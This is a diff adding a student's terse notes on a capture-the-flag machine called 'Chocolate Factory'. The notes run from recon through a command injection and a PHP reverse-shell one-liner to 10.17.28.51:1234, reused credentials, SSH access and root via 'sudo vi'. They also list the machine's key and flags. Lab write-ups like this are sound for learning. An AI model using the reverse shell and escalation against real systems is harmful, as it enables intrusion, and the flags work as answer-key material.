@@ -1,0 +1,74 @@
+Name : Padsala Tushal
+Date : 14/11/2021
+Machine : Chocolate Factory
+
+
+-Reconnaissance
+	-nmap 
+		-port 80
+
+		-port 100 
+			 Mr.Wonka 
+		-bunch of other stupid stuff 
+
+	-ftp
+		-a png file
+
+	-index.html
+			-login page
+ 	
+	-gobuster
+		-home.php
+			-command injection
+				-key_rev_key
+					-looks like some date in here
+					-after looking write ups
+						-strings key_rev_key
+						-looking closely
+							key = -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+				-php revershell cheatsheet pentest monkey
+					php -r '$sock=fsockopen("10.17.28.51",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+		
+		
+-Get Access
+	-after with php revershell we can get access
+	-user charlie
+	-can't have permission to read user.txt
+	-in /home/charlie there is rsa key
+	-let's upgrade sheel to tty shell
+		script -qc /bin/bash /dev/null
+
+	-remering we have weblogin page after we can get shell we will see validate php file source data for username and password
+		-/var/www/html
+			-validate.php
+				charlie cn7824
+
+
+-Swith to charlie
+	-after we get id_rsa key we can just login to ssh with charlie user if there is not passfase
+	-yeah we are now login with charlie
+	-firsts let get the user flag
+		flag{cd5509042371b34e4826e4838b522d2e}
+
+-Privilege Escalation
+		-sudo -l
+		-we can run vi as root 
+		-gtfobin	
+			sudo vi -c ':!/bin/sh' /dev/null
+
+		-that was easy with gtfo bin
+ 		
+ 		-now we are root
+
+ 		-no there is not root.txt but it's root.py
+
+ 		-after doing lot's things
+ 		-read write ups
+ 		-ohh that first key is this root.py password
+ 			b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+
+ 		-finally found root flag
+ 			flag{cec59161d338fef787fcb4e296b42124}
+
+
+ 		-it's really great room and enjoy this room 
